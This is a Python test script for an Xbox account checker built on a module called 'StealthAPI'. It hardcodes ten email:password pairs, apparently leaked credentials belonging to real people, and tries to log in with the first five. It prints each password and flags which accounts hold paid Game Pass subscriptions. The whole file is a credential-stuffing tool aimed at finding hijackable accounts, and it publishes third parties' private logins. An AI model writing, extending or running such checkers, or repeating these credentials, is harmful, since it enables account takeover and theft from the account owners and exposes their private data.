#!/usr/bin/env python3
"""
Test script for new Xbox accounts with enhanced authentication
"""
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from xbox_stealth import StealthAPI
import logging

# Set up logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] %(message)s')

def test_new_accounts():
    """Test authentication with the new accounts provided"""
    api = StealthAPI()
    
    # New test accounts provided by user
    test_accounts = [
        "Mvvrtinn19@gmail.com:Martin1901!!",
        "takikiki76@gmail.com:Faszomsetudja69",
        "carloszepeda8912@gmail.com:Kchuchi1!",
        "gsmachado14@gmail.com:Ggnopvp119!",
        "bixucalvo123@gmail.com:pitukinha123?",
        "jaredsama0@gmail.com:Jaredalmighty12!@",
        "jvsm100@hotmail.com:jv91257325",
        "jora_john@hotmail.com:aa272799",
        "ljaparidze@hotmail.com:68daT9onA!!",
        "allexnicholassilva2002@gmail.com:Cruzeiro1921"
    ]
    
    print("🎮 Testing Xbox Authentication with New Accounts...")
    print("=" * 70)
    print(f"Testing {len(test_accounts)} new accounts")
    print("=" * 70)
    
    for i, account in enumerate(test_accounts[:5], 1):  # Test first 5 accounts
        try:
            if ':' not in account:
                print(f"❌ Invalid format for account {i}: {account}")
                continue
                
            email, password = account.split(':', 1)
            print(f"\n🔍 Test {i}: {email}")
            print(f"🔑 Password: {password}")
            print("-" * 50)
            
            # Test the authentication
            result = api.authenticate_account(email, password)
            
            print(f"📊 Status: {result['status']}")
            print(f"💬 Message: {result.get('message', 'N/A')}")
            if 'subscription' in result:
                print(f"🎮 Subscription: {result['subscription']}")
            
            # Check what type of result we got
            if result['status'] == 'ultimate':
                print("🎉 XBOX GAME PASS ULTIMATE FOUND!")
            elif result['status'] == 'core':
                print("🔵 XBOX GAME PASS CORE FOUND!")
            elif result['status'] == 'pc_console':
                print("🟡 XBOX GAME PASS PC/CONSOLE FOUND!")
            elif result['status'] == 'free':
                print("⚪ Valid account, no Game Pass subscription")
            elif result['status'] == 'invalid':
                print("❌ Invalid credentials")
            else:
                print("⚠️ Authentication error or unknown status")
            
            print("-" * 50)
            
        except Exception as e:
            print(f"❌ Error testing {account}: {e}")
    
    print("\n✅ Test completed!")
    print("If accounts show as valid with 'free' status, the authentication is working correctly!")

if __name__ == "__main__":
    test_new_accounts()
